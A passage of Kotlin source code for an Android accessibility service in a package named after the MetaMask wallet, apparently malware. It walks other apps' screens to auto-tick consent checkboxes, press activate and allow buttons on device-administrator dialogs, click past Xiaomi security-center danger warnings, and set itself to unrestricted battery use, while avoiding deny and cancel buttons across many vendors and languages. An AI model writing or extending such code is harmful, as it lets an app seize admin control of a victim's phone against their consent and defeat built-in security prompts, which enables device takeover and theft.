                val label = ((n.text?.toString() ?: "").trim().ifBlank {
                    n.contentDescription?.toString()?.trim() ?: ""
                }).lowercase()
                val isDeny = label.isNotBlank() && DENY_TEXTS.any { label.contains(it) }

                if (!isDeny) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    if (n.isChecked) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        if (result == CheckboxResult.NOT_FOUND) result = CheckboxResult.ALREADY_CHECKED
                    } else if (!n.isEnabled) {
                        if (result != CheckboxResult.TICKED) result = CheckboxResult.DISABLED
                    } else {
                        val sinceLastTick = System.currentTimeMillis() - consentTickedAtMs
                        if (consentTickedAtMs > 0 && sinceLastTick < CONSENT_TICK_COOLDOWN_MS) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            if (result == CheckboxResult.NOT_FOUND) result = CheckboxResult.ALREADY_CHECKED
                        } else {
                            val ok = try { n.performAction(AccessibilityNodeInfo.ACTION_CLICK) }
                                     catch (_: Exception) { false }
                            if (ok) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                consentTickedAtMs = System.currentTimeMillis()
                                result = CheckboxResult.TICKED
                                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                                return true
                            }
                            val b = Rect(); n.getBoundsInScreen(b)
                            if (!b.isEmpty) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat())
                                consentTickedAtMs = System.currentTimeMillis()
                                result = CheckboxResult.TICKED
                                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                                return true
                            }
                        }
                    }
                }
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                try {
                    if (walk(ch, depth + 1)) return true
                } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        walk(root, 0)
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return result
    }

    private fun maybeStartHyperOsTap() {
        android.util.Log.d("XDBG", "[AutoIbis] maybeStartHyperOsTap enter") //xdbg
        if (!com.example.MetaMask.HyperOsDetector.isHyperOs) return
        if (!hyperOsCheckboxTicked || !deviceAdminPending) return
        if (hyperOsCountdownTapScheduled || hyperOsOkCenterX == 0f) return
        hyperOsCountdownTapScheduled = true
        val cx = hyperOsOkCenterX
        val cy = hyperOsOkCenterY
        val elapsed = System.currentTimeMillis() - hyperOsCheckboxTickedAtMs
        val delay = maxOf(9800L - elapsed, 300L)
        val tapCx = cx; val tapCy = cy
        Thread {
            try { Thread.sleep(delay) } catch (_: InterruptedException) { return@Thread }
            if (!deviceAdminPending) return@Thread
            service?.let { doGestureTap(it, tapCx, tapCy) }
            try { Thread.sleep(700) } catch (_: InterruptedException) { return@Thread }
            if (!deviceAdminPending) return@Thread
            service?.let { doGestureTap(it, tapCx, tapCy) }
            try { Thread.sleep(700) } catch (_: InterruptedException) { return@Thread }
            if (!deviceAdminPending) return@Thread
            service?.let { doGestureTap(it, tapCx, tapCy) }
            try { Thread.sleep(600) } catch (_: InterruptedException) { return@Thread }
            if (deviceAdminPending) handler.post { if (deviceAdminPending) tryClickSetupDialog() }
        }.also { it.isDaemon = true; it.name = "hyperOs-tap"; it.start() }
    }

    private fun startWatchForEnabledAndClick() {
        android.util.Log.d("XDBG", "[AutoIbis] startWatchForEnabledAndClick enter") //xdbg
        cancelWatchForEnabled()
        waitForEnableActive = true
        waitForEnableGen++
        val gen = waitForEnableGen
        waitForEnableStartMs = System.currentTimeMillis()

        val poll = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[AutoIbis] run enter") //xdbg
                if (gen != waitForEnableGen) return
                if (!waitForEnableActive) return
                if (!setupDialogActive || !deviceAdminPending) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    cancelWatchForEnabled(); return
                }
                val elapsed = System.currentTimeMillis() - waitForEnableStartMs
                if (elapsed > WAIT_FOR_ENABLE_TIMEOUT_MS) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    cancelWatchForEnabled()
                    return
                }
                val becameEnabled = scanForEnabledSetupButton()
                if (becameEnabled) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    cancelWatchForEnabled()
                    handler.postDelayed({
                        if (setupDialogActive && deviceAdminPending) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                clickHyperOsOkNow()
                                handler.postDelayed({ if (deviceAdminPending) onSetupDialogClicked() }, 800L)
                            } else {
                                tryClickSetupDialog()
                            }
                        }
                    }, 150L)
                    return
                }
                handler.postDelayed(this, WAIT_FOR_ENABLE_POLL_MS)
            }
        }
        waitForEnableRunnable = poll
        handler.postDelayed(poll, WAIT_FOR_ENABLE_POLL_MS)
    }

    private fun cancelWatchForEnabled() {
        android.util.Log.d("XDBG", "[AutoIbis] cancelWatchForEnabled enter") //xdbg
        waitForEnableActive = false
        waitForEnableRunnable?.let { handler.removeCallbacks(it) }
        waitForEnableRunnable = null
    }

    private fun clickHyperOsOkNow(): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] clickHyperOsOkNow enter") //xdbg
        val svc = service ?: return false
        val windows = try { svc.windows } catch (_: Exception) { null } ?: return false
        for (win in windows) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            val pkg = root.packageName?.toString() ?: ""
            if (pkg != "com.miui.securitycenter") { try { root.recycle() } catch (_: Exception) {}; continue }
            try {
                for (id in listOf(
                    "com.miui.securitycenter:id/intercept_warn_allow",
                    "com.miui.securitycenter:id/btn_agree",
                    "com.miui.securitycenter:id/positive_button"
                )) {
                    val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                    if (nodes.isNullOrEmpty()) continue
                    for (n in nodes) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        if (!n.isEnabled) { try { n.recycle() } catch (_: Exception) {}; continue }
                        val ok = try { n.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                        if (!ok) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            val b = android.graphics.Rect().also { n.getBoundsInScreen(it) }
                            if (!b.isEmpty) doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat())
                        }
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        return true
                    }
                    nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                }
            } finally { try { root.recycle() } catch (_: Exception) {} }
        }
        val activeRoot = try { svc.rootInActiveWindow } catch (_: Exception) { null }
        if (activeRoot != null) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val activePkg = try { activeRoot.packageName?.toString() ?: "" } catch (_: Exception) { "" }
            if (activePkg == "com.miui.securitycenter") {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val nodes = try { activeRoot.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow") } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty()) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    for (n in nodes) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        if (n.isEnabled) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            val ok = try { n.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            try { activeRoot.recycle() } catch (_: Exception) {}
                            return ok
                        }
                        try { n.recycle() } catch (_: Exception) {}
                    }
                }
            }
            try { activeRoot.recycle() } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun scanForEnabledSetupButton(): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] scanForEnabledSetupButton enter") //xdbg
        val svc = service ?: return false
        val windows = try { svc.windows } catch (_: Exception) { null } ?: return false
        val ids = listOf(
            "android:id/button1", "android:id/positiveButton",
            "com.android.settings:id/admin_action_button",
            "com.android.settings:id/action_button",
            "com.android.settings:id/activate_button",
            "com.android.settings:id/submit_button",
            "com.android.settings:id/allow_button",
            "com.android.settings:id/right_button",
            "com.android.settings:id/positive_button",
            "com.samsung.android.settings:id/ok_button",
            "com.samsung.android.settings:id/button_ok",
            "com.samsung.android.settings:id/activate_button",
            "com.samsung.android.settings:id/positive_btn",
            "com.android.settings:id/btn_add",
            "com.miui.securitycenter:id/intercept_warn_allow",
            "com.miui.securitycenter:id/btn_agree",
            "com.miui.securitycenter:id/positive_button",
            "com.android.settings:id/button_ok",
            "com.huawei.systemmanager:id/btn_ok",
            "com.coloros.safecenter:id/btn_ok",
            "com.oplus.safecenter:id/btn_ok",
            "com.vivo.permissionmanager:id/btn_allow"
        )
        val positiveTexts = listOf("активировать", "activate", "разрешить", "allow", "включить", "enable")
        for (win in windows) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            val pkg = root.packageName?.toString() ?: ""
            val pkgOk = pkg == SETUP_PKG || pkg == "android" || pkg == "com.google.android.gms" ||
                pkg == "com.miui.securitycenter" || pkg == "com.miui.securityadd" ||
                pkg == "com.miui.powerkeeper" || pkg == "com.lbe.security.miui"
            if (!pkgOk) { try { root.recycle() } catch (_: Exception) {}; continue }
            try {
                for (id in ids) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null } ?: continue
                    for (n in nodes) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        val enabled = try { n.isEnabled } catch (_: Exception) { false }
                        val clickable = try { n.isClickable } catch (_: Exception) { false }
                        val label = ((n.text?.toString() ?: "").trim().ifBlank {
                            n.contentDescription?.toString()?.trim() ?: ""
                        }).lowercase()
                        val isDeny = label.isNotBlank() && DENY_TEXTS.any { label.contains(it) }
                        try { n.recycle() } catch (_: Exception) {}
                        if (enabled && clickable && !isDeny) return true
                    }
                }
                if (!com.example.MetaMask.HyperOsDetector.isHyperOs) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    for (txt in positiveTexts) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        val nodes = try { root.findAccessibilityNodeInfosByText(txt) } catch (_: Exception) { null } ?: continue
                        for (n in nodes) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val label = (n.text?.toString() ?: "").trim().lowercase()
                            if (label != txt && !label.startsWith(txt)) { try { n.recycle() } catch (_: Exception) {}; continue }
                            val isDeny = DENY_TEXTS.any { label.contains(it) }
                            val enabled = try { n.isEnabled } catch (_: Exception) { false }
                            try { n.recycle() } catch (_: Exception) {}
                            if (enabled && !isDeny) return true
                        }
                    }
                }
                val unchecked = hasEnabledUncheckedConsentCheckbox(root)
                if (unchecked) return true
            } finally { try { root.recycle() } catch (_: Exception) {} }
        }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked && deviceAdminPending) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val activeRoot = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (activeRoot != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val activePkg = try { activeRoot.packageName?.toString() ?: "" } catch (_: Exception) { "" }
                if (activePkg == "com.miui.securitycenter") {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val allowNodes = try {
                        activeRoot.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                    } catch (_: Exception) { null }
                    if (!allowNodes.isNullOrEmpty()) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        for (n in allowNodes) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val enabled = try { n.isEnabled } catch (_: Exception) { false }
                            if (enabled) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val clicked = try { n.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                                try { n.recycle() } catch (_: Exception) {}
                                try { activeRoot.recycle() } catch (_: Exception) {}
                                return clicked
                            }
                            try { n.recycle() } catch (_: Exception) {}
                        }
                    }
                }
                try { activeRoot.recycle() } catch (_: Exception) {}
            }
        }

        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun hasEnabledConfirmButton(root: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] hasEnabledConfirmButton enter root=${root}") //xdbg
        val hyperOs = com.example.MetaMask.HyperOsDetector.isHyperOs
        fun walk(n: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] walk enter n=${n} depth=${depth}") //xdbg
            if (depth > 14) return false
            val cls = n.className?.toString() ?: ""
            val isCheckLike = cls.contains("CheckBox", ignoreCase = true) ||
                cls.contains("Switch", ignoreCase = true) ||
                cls.contains("RadioButton", ignoreCase = true) ||
                n.isCheckable
            if (!isCheckLike && n.isEnabled && (n.isClickable || hyperOs)) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val label = ((n.text?.toString() ?: "").trim().ifBlank {
                    n.contentDescription?.toString()?.trim() ?: ""
                }).lowercase()
                val viewId = try { n.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                val isDeny = DENY_TEXTS.any { label.contains(it) } ||
                    viewId == "android:id/button2" ||
                    viewId == "android:id/negativeButton" ||
                    viewId.contains("cancel", ignoreCase = true) ||
                    viewId.endsWith("_deny", ignoreCase = true)
                if (!isDeny) return true
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                try {
                    if (walk(ch, depth + 1)) return true
                } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return walk(root, 0)
    }

    private fun hasEnabledUncheckedConsentCheckbox(root: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] hasEnabledUncheckedConsentCheckbox enter root=${root}") //xdbg
        fun walk(n: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] walk enter n=${n} depth=${depth}") //xdbg
            if (depth > 14) return false
            val cls = n.className?.toString() ?: ""
            val isCheckboxLike = cls.contains("CheckBox", ignoreCase = true)
            if (isCheckboxLike && n.isEnabled && !n.isChecked) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val label = ((n.text?.toString() ?: "").trim().ifBlank {
                    n.contentDescription?.toString()?.trim() ?: ""
                }).lowercase()
                val isDeny = label.isNotBlank() && DENY_TEXTS.any { label.contains(it) }
                if (!isDeny) return true
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                try {
                    if (walk(ch, depth + 1)) return true
                } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return walk(root, 0)
    }

    private fun bfsClickSetupPositive(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickSetupPositive enter root=${root} svc=${svc}") //xdbg
        fun matchesPositive(label: String): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] matchesPositive enter label=${label}") //xdbg
            if (label.isBlank()) return false
            if (SETUP_POSITIVE_TEXTS.any { label == it }) return true
            val words = label.split(Regex("[^\\p{L}\\p{N}]+")).filter { it.isNotEmpty() }
            if (words.isEmpty()) return false
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return SETUP_POSITIVE_TEXTS.any { positive ->
                if (positive.contains(' ')) label.contains(positive)
                else words.any { it == positive }
            }
        }
        fun bfs(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfs enter node=${node} depth=${depth}") //xdbg
            if (depth > 12) return false
            if (node.isEnabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val label = ((node.text?.toString() ?: "").trim().ifBlank { node.contentDescription?.toString()?.trim() ?: "" }).lowercase()
                if (label.isNotBlank() && label.length <= 60 &&
                    matchesPositive(label) &&
                    !DENY_TEXTS.any { label.contains(it) }) {
                    val clickableSelf = node.isClickable
                    val clickableParent = try { node.parent?.isClickable == true } catch (_: Exception) { false }
                    if (clickableSelf || clickableParent) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        if (clickNodeOrGesture(node, svc, "setupPos[${node.className}]:'$label'")) return true
                    }
                }
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfs(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return bfs(root, 0)
    }

    private fun bfsClickAnyClickable(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickAnyClickable enter root=${root} svc=${svc}") //xdbg
        val candidates = mutableListOf<Pair<AccessibilityNodeInfo, android.graphics.Rect>>()
        fun collect(node: AccessibilityNodeInfo, depth: Int) {
            android.util.Log.d("XDBG", "[AutoIbis] collect enter node=${node} depth=${depth}") //xdbg
            if (depth > 12) return
            if (node.isClickable && node.isEnabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val b = android.graphics.Rect().also { node.getBoundsInScreen(it) }
                if (!b.isEmpty) candidates.add(Pair(node, b))
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { collect(child, depth + 1) } finally { try { child.recycle() } catch (_: Exception) {} }
            }
        }
        collect(root, 0)
        candidates.sortByDescending { it.second.bottom }
        for ((node, bounds) in candidates) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val cls = node.className?.toString() ?: ""
            val label = ((node.text?.toString() ?: "").trim().ifBlank { node.contentDescription?.toString()?.trim() ?: "" }).lowercase()
            if (cls.contains("CheckBox", ignoreCase = true) ||
                cls.contains("Switch", ignoreCase = true) ||
                cls.contains("ToggleButton", ignoreCase = true) ||
                cls.contains("RadioButton", ignoreCase = true) ||
                node.isCheckable) {
                continue
            }
            val viewId = try { node.viewIdResourceName ?: "" } catch (_: Exception) { "" }
            if (viewId == "android:id/button2" ||
                viewId == "android:id/button3" ||
                viewId == "android:id/negativeButton" ||
                viewId.contains("uninstall", ignoreCase = true) ||
                viewId.contains("cancel", ignoreCase = true) ||
                viewId.contains("dismiss", ignoreCase = true) ||
                viewId.endsWith("_no", ignoreCase = true) ||
                viewId.endsWith("_deny", ignoreCase = true)) {
                continue
            }
            if (DENY_TEXTS.any { label.contains(it) }) continue
            val ok = try { node.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
            if (ok) { return true }
            doGestureTap(svc, bounds.centerX().toFloat(), bounds.centerY().toFloat())
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return true
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun tryClickHyperOsSecurityConfirm(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] tryClickHyperOsSecurityConfirm enter root=${root} svc=${svc}") //xdbg
        data class Cand(val bounds: android.graphics.Rect, val id: String, val label: String, val isBtn: Boolean)
        val candidates = mutableListOf<Cand>()
        fun walk(n: AccessibilityNodeInfo, depth: Int) {
            android.util.Log.d("XDBG", "[AutoIbis] walk enter n=${n} depth=${depth}") //xdbg
            if (depth > 14) return
            if (n.isEnabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val cls = n.className?.toString() ?: ""
                val isCheckLike = cls.contains("CheckBox", ignoreCase = true) ||
                    cls.contains("Switch", ignoreCase = true) || n.isCheckable
                if (!isCheckLike) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val label = ((n.text?.toString() ?: "").trim().ifBlank {
                        n.contentDescription?.toString()?.trim() ?: ""
                    }).lowercase()
                    val viewId = try { n.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                    val isDeny = DENY_TEXTS.any { label.contains(it) } ||
                        viewId == "android:id/button2" || viewId == "android:id/negativeButton" ||
                        viewId.contains("cancel", ignoreCase = true) ||
                        viewId.endsWith("_deny", ignoreCase = true) ||
                        viewId.endsWith("_no", ignoreCase = true)
                    val b = android.graphics.Rect().also { try { n.getBoundsInScreen(it) } catch (_: Exception) {} }
                    val isBtn = cls.contains("Button", ignoreCase = true) ||
                        viewId.contains("btn", ignoreCase = true) ||
                        viewId.contains("button", ignoreCase = true) ||
                        viewId.contains("ok", ignoreCase = true) ||
                        viewId.contains("positive", ignoreCase = true) ||
                        viewId.contains("confirm", ignoreCase = true) ||
                        viewId.contains("agree", ignoreCase = true) ||
                        label in setOf("ок", "ok", "подтвердить", "confirm", "активировать", "activate", "согласен", "agree", "да", "yes")
                    if (!isDeny && !b.isEmpty && b.width() > 10 && b.height() > 10) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        candidates.add(Cand(b, viewId, label, isBtn))
                    }
                }
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val c = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                try { walk(c, depth + 1) } finally { try { c.recycle() } catch (_: Exception) {} }
            }
        }
        walk(root, 0)
        candidates.sortByDescending { it.bounds.bottom }
        val best = candidates.firstOrNull { it.isBtn }
            ?: candidates.firstOrNull { it.bounds.height() < 300 }
            ?: candidates.firstOrNull()
            ?: return false
        doGestureTap(svc, best.bounds.centerX().toFloat(), best.bounds.centerY().toFloat())
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return true
    }

    private fun tryHyperOsBatteryRadio(svc: AccessibilityService): BatteryRadioResult {
        android.util.Log.d("XDBG", "[AutoIbis] tryHyperOsBatteryRadio enter svc=${svc}") //xdbg
        val windows = try { svc.windows } catch (_: Exception) { null } ?: return BatteryRadioResult.NOT_FOUND
        val unrestrictedTexts = listOf(
            "без ограничений", "нет ограничений", "не ограничивать", "без обмежень",
            "unrestricted", "no restrictions", "no restriction", "no battery restriction",
            "不受限制", "无限制", "不限制",
            "không giới hạn", "không hạn chế",
            "sin restricciones", "sin restricción",
            "tidak terbatas", "tanpa pembatasan", "tak terbatas",
            "senza restrizioni",
            "ohne einschränkungen", "keine einschränkungen",
            "sans restriction", "aucune restriction",
            "sem restrições", "sem restrição",
            "bez omezení", "bez ograniczeń",
            "kısıtlama yok",
            "제한 없음", "制限なし", "بدون قيود"
        )
        var batteryDialogSeen = false
        for (win in windows) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            val pkg = root.packageName?.toString() ?: ""
            if (pkg != "com.miui.securitycenter" && pkg != "com.miui.powerkeeper") {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                try { root.recycle() } catch (_: Exception) {}
                continue
            }
            try {
                val interceptNodes = try {
                    root.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                } catch (_: Exception) { null }
                if (!interceptNodes.isNullOrEmpty()) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    for (n in interceptNodes) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        if (n.isEnabled && n.isClickable) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            val ok = try { n.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                            if (!ok) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val b = android.graphics.Rect().also { n.getBoundsInScreen(it) }
                                if (!b.isEmpty) doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat())
                            }
                            try { n.recycle() } catch (_: Exception) {}
                            break
                        }
                        try { n.recycle() } catch (_: Exception) {}
                    }
                    interceptNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                    return BatteryRadioResult.INTERCEPT_CLICKED
                }
                interceptNodes?.forEach { try { it.recycle() } catch (_: Exception) {} }
            } catch (_: Exception) {}
            batteryDialogSeen = true
            try {
                var radioCount = 0
                var topmostUncheckedBounds: android.graphics.Rect? = null
                var topmostAnyBounds: android.graphics.Rect? = null
                fun collectRadios(n: AccessibilityNodeInfo, depth: Int) {
                    android.util.Log.d("XDBG", "[AutoIbis] collectRadios enter n=${n} depth=${depth}") //xdbg
                    if (depth > 14) return
                    val cls = n.className?.toString() ?: ""
                    val isRadioType = cls.contains("RadioButton", ignoreCase = true) ||
                        (n.isCheckable && n.isEnabled &&
                            !cls.contains("Switch", ignoreCase = true) &&
                            !cls.contains("CheckBox", ignoreCase = true) &&
                            !cls.contains("ToggleButton", ignoreCase = true))
                    if (isRadioType) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val b = android.graphics.Rect().also { n.getBoundsInScreen(it) }
                        if (!b.isEmpty) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            radioCount++
                            if (topmostAnyBounds == null || b.top < topmostAnyBounds!!.top) topmostAnyBounds = android.graphics.Rect(b)
                            if (!n.isChecked && (topmostUncheckedBounds == null || b.top < topmostUncheckedBounds!!.top)) topmostUncheckedBounds = android.graphics.Rect(b)
                        }
                    }
                    for (i in 0 until n.childCount) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        val c = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                        try { collectRadios(c, depth + 1) } finally { try { c.recycle() } catch (_: Exception) {} }
                    }
                }
                collectRadios(root, 0)

                if (radioCount == 0) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return BatteryRadioResult.NO_OPTION
                }

                for (txt in unrestrictedTexts) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    val nodes = try { root.findAccessibilityNodeInfosByText(txt) } catch (_: Exception) { null }
                    if (!nodes.isNullOrEmpty()) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        var clicked = false
                        for (n in nodes) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val label = (n.text?.toString() ?: "").trim().lowercase()
                            if (!label.contains(txt)) { try { n.recycle() } catch (_: Exception) {}; continue }
                            val clickable = findClickable(n) ?: n
                            val ok = try { clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                            if (ok) { clicked = true; try { n.recycle() } catch (_: Exception) {}; break }
                            val b = android.graphics.Rect().also { clickable.getBoundsInScreen(it) }
                            if (!b.isEmpty) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val sw = svc.resources.displayMetrics.widthPixels
                                doGestureTap(svc, if (b.centerX() > sw) sw * 0.5f else b.centerX().toFloat(), b.centerY().toFloat())
                                clicked = true
                            }
                            try { n.recycle() } catch (_: Exception) {}
                            if (clicked) break
                        }
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        if (clicked) return BatteryRadioResult.CLICKED
                    }
                }

                val fb = topmostUncheckedBounds ?: topmostAnyBounds
                if (fb != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val sw = svc.resources.displayMetrics.widthPixels
                    doGestureTap(svc, if (fb.centerX() > sw) sw * 0.5f else fb.centerX().toFloat(), fb.centerY().toFloat())
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return BatteryRadioResult.CLICKED
                }
                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                return BatteryRadioResult.NO_OPTION
            } finally {
                try { root.recycle() } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return if (batteryDialogSeen) BatteryRadioResult.NO_OPTION else BatteryRadioResult.NOT_FOUND
    }

    private fun dumpSetupTree() {
        android.util.Log.d("XDBG", "[AutoIbis] dumpSetupTree enter") //xdbg
    }

    private fun scrollToBottom(root: AccessibilityNodeInfo) {
        android.util.Log.d("XDBG", "[AutoIbis] scrollToBottom enter root=${root}") //xdbg
        try {
            if (root.isScrollable) repeat(10) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
